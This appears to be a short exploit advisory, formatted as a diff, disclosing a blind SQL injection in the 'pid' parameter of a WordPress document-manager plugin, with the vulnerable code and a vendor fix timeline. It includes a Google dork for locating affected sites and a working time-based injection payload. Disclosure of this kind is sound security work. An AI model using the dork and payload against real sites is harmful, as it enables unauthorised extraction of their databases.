@@ -1,0 +1,41 @@
+# Exploit Title: WordPress SP Project & Document Manager 2.5.3 Blind SQL Injection
+# Google Dork: inurl:wp-content/plugins/sp-client-document-manager
+# Date: 2015-03-04
+# Exploit Author: catsecurity
+# Vendor Homepage: http://smartypantsplugins.com
+# Software Link: https://downloads.wordpress.org/plugin/sp-client-document-manager.2.5.3.zip
+# Version: version 2.5.3 and previous version
+# Tested on: Chrome (It's PHP Application)
+# CVE : N/A
+
+
+# Timeline #
+[2015.03.05] Reported to the Vendor
+[2015.03.06?] Fixed in Update 2.5.4
+
+ 
+# Details #
+
+- This vulnerability did not process integer parameters. Unauthorized users can attact the webstites that use this plugin.
+- Vulnerability code in the thumbnails() function which exists in the [ /wp-content/plugins/sp-client-document-manager/ajax.php ].
+- "pid" variable is not sanitized
+
+
+# Vulnerable code #
+
+Line 1132:        echo '<div id="dlg_cdm_thumbnails">';
+Line 1133:        if ($_GET['pid'] != "") {
+Line 1134:            $r_current_project = $wpdb->get_results("SELECT *  FROM " . $wpdb->prefix . "sp_cu_project  WHERE id = " . $_GET['pid'] . "", ARRAY_A);
+Line 1135:        }
+
+
+# POC #
+/wordpress/wp-content/plugins/sp-client-document-manager/ajax.php?function=thumbnails&pid=[SQLi]
+
+example:
+/wordpress/wp-content/plugins/sp-client-document-manager/ajax.php?function=thumbnails&pid=if(substr(database(),1,1)=0x61,sleep(5),1)
+
+if yes it will sleep 5 seconds.
+
+
+This vulnerable parameters must trance to integer
